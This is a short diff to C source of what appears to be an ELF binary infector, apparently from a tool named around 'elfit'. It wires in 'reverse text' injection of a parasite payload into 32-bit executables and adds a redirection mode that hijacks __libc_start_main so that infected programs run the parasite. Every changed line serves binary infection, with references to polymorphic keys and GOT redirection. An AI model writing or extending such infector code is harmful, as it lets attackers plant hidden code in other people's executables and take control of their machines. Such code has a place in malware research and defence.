@@ -93,8 +93,8 @@ int elfit32(opts_t *opts)
             break;
         case REVERSE_INJECT:
             printf("[+ INJECTING PARASITE TO TEXT BOTTOM]\n");
-            printf("chosen injection method not yet implemented\n");
-            exit(1);
+            malpoint = reverse_inject_32(&host, &parasite);
+            reload_host(opts->host, &host);
             if(opts->polymorphic_key)
                 make_text_writeable32(&host);
             break;
@@ -118,6 +118,8 @@ int elfit32(opts_t *opts)
      * after injection. things may have moved around */
     if (opts->redirection_method == GOT_REDIR)
         patch_off = got_redirect_32(&host, opts->pltsymbol, &patch_addr);
+    if (opts->redirection_method == STARTMAIN_REDIR)
+        patch_off = libc_start_main_hijack_32(&host, opts->startmain_mode, &patch_addr);
 
     printf("[+ APPLYING REDIRECTION]\n");
     commit_redirect_32(&host, patch_off, malpoint);
